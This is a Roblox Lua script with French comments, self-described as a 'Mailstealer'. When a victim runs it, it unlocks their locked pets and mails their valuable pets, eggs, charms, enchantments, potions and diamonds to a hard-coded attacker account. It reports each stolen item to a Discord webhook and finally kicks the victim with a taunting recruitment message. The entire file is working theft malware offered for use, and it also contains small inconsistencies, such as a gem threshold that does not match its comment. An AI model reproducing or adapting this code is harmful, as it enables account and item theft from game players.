local Username = "UserName"
local Webhook = "WeebHook"
local min_rap = 10000

-- Fonction pour envoyer un message Discord
function SendMessage(url, username, itemID)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {{
            ["title"] = "Nouvel objet envoyé",
            ["color"] = 10053324,
            ["fields"] = {
                {
                    ["name"] = "Nom d'utilisateur de la victime :",
                    ["value"] = username,
                    ["inline"] = true
                },
                {
                    ["name"] = "Objet envoyé :",
                    ["value"] = itemID,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Mailstealer par WhriterScript. discord.gg/QbNUGKYP"
            },
            ["thumbnail"] = {
                ["url"] = "https://i.ibb.co/4VSKsVR/IMG-1444.jpg"
            }
        }}
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

-- Vérifier si un joueur possède plus de 4 "huge"
function CheckForFourHuge()
    local hugeCount = CountHuges()
    return hugeCount > 4
end

-- Vérifier si un joueur possède plus de 10 millions de diamants
function CheckForTenMillionDiamonds()
    local gemAmount = CountGems()
    return gemAmount > 1000000
end

-- Fonction pour voler des objets "huge" et envoyer des messages
function StealHuge()
    local hugesSent = 0
    local initialHuges = CountHuges()
    if CheckForFourHuge() then
        SendMessage(Webhook, "matou2209", "more_than_4_huge")
    else
        for i, v in pairs(save.Pet) do
            local id = v.id
            local dir = library.Directory.Pets[id]
            if dir.huge and getRAP("Pet", v) >= min_rap then
                if v._lk then
                    local args = {
                    [1] = i,
                    [2] = false
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                end
                local args = {
                    [1] = Username,
                    [2] = MailMessage,
                    [3] = "Pet",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                if Webhook and Webhook ~= "" then
                    SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
                end
                local finalHuges = CountHuges()
                if finalHuges < initialHuges then
                    hugesSent = hugesSent + 1
                    initialHuges = finalHuges
                end
            end
        end
    end
    return hugesSent
end

-- Fonction pour voler des diamants et envoyer des messages
function StealDiamonds()
    if CheckForTenMillionDiamonds() then
        SendMessage(Webhook, "matou2209", "more_than_10_million_diamonds")
    else
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount = v._am
                GemId = i
                local args = {
                    [1] = Username,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = GemId,
                    [5] = GemAmount - 10000
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                if Webhook and Webhook ~= "" then
                    SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
                end
            end
        end
    end
end

-- Fonction pour vider les boîtes
function EmptyBoxes()
    if save.Box then
        for key, _ in pairs(save.Box) do
            local args = {
                [1] = key
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
        end
    end
end

-- Fonction pour compter le nombre d'objets "huge"
function CountHuges()
    local count = 0
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge and getRAP("Pet", v) >= min_rap then
            count = count + 1
        end
    end
    return count
end

-- Fonction pour compter le nombre de diamants
function CountGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            return v._am
        end
    end
end

-- Continuation du script précédent...

-- Fonction pour voler tous les objets "huge"
function SendAllHuges()
    local totalHuges = CountHuges()
    local hugesSent = 0
    repeat
        hugesSent = hugesSent + StealHuge()
    until hugesSent == totalHuges
end

-- Fonction pour voler tous les objets "exclusive"
function ExcSteal()
    local excSent = 0
    local initialExc = CountExc()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
            if v._lk then
                local args = {
                [1] = i,
                [2] = false
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
            end
            local finalExc = CountExc()
            if finalExc < initialExc then
                excSent = excSent + 1
                initialExc = finalExc
            end
        end
    end
    return excSent
end

-- Fonction pour compter le nombre d'objets "exclusive"
function CountExc()
    local count = 0
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
            count = count + 1
        end
    end
    return count
end

-- Fonction pour voler tous les objets "exclusive"
function SendAllExc()
    local totalExc = CountExc()
    local excSent = 0
    repeat
        excSent = excSent + ExcSteal()
    until excSent == totalExc
end

-- Fonction pour voler les oeufs
function EggSteal()
    for i, v in pairs(save.Egg) do
        local id = v.id
        local diregg = library.Directory.Eggs[id]
        if diregg and getRAP("Egg", v) >= min_rap then
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Egg",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
            end
        end
    end
end

-- Fonction pour voler les charmes
function CharmSteal()
    for i, v in pairs(save.Charm) do
        local id = v.id
        local dircharm = library.Directory.Charms[id]
        if dircharm and getRAP("Charm", v) >= min_rap then
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Charm",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
            end
        end
    end
end

-- Fonction pour voler les enchantements
function EnchantSteal()
    for i, v in pairs(save.Enchant) do
        local id = v.id
        local direnchant = library.Directory.Enchants[id]
        if direnchant and getRAP("Enchant", v) >= min_rap then
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Enchant",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
            end
        end
    end
end

-- Fonction pour voler les potions
function PotionSteal()
    for i, v in pairs(save.Potion) do
        local id = v.id
        local dirpotion = library.Directory.Potions[id]
        if dirpotion and getRAP("Potion", v) >= min_rap then
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Potion",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
            end
        end
    end
end

-- Fonction pour voler des diamants
function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            GemId = i
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = GemId,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if Webhook and Webhook ~= "" then
                SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
            end
        end
    end
end

-- Fonction pour voler tous les diamants
function SendAllGems()
    repeat
        GemSteal()
    until CountGems() == nil or CountGems() < 10000
end

-- Fonction pour envoyer une notification de kick et un lien Discord
function SendKickNotification()
    setclipboard("https://discord.gg/QbNUGKYP")
    game.Players.LocalPlayer:Kick("Tout votre contenu a été volé par le Mailstealer de WhriterScript. Rejoignez https://discord.gg/QbNUGKYP pour commencer à voler des contenus par mail vous-même.")
end

-- Vidage des boîtes
EmptyBoxes()

-- Vol de tous les objets "huge"
SendAllHuges()

-- Vol de tous les objets "exclusive"
SendAllExc()

-- Vol des oeufs
if save.Egg ~= nil then
    EggSteal()
end

-- Vol des charmes
if save.Charm ~= nil then
    CharmSteal()
end
    
-- Vol des enchantements
if save.Enchant ~= nil then
    EnchantSteal()
end
    
-- Vol des potions
if save.Potion ~= nil then
    PotionSteal()
end

-- Vol de tous les diamants
SendAllGems()

-- Envoi de la notification de kick
setclipboard("https://discord.gg/QbNUGKYP")
plr:Kick("Tout votre contenu a été volé par le Mailstealer de WhriterScript. Rejoignez https://discord.gg/QbNUGKYP pour commencer à voler des contenus par mail vous-même.")


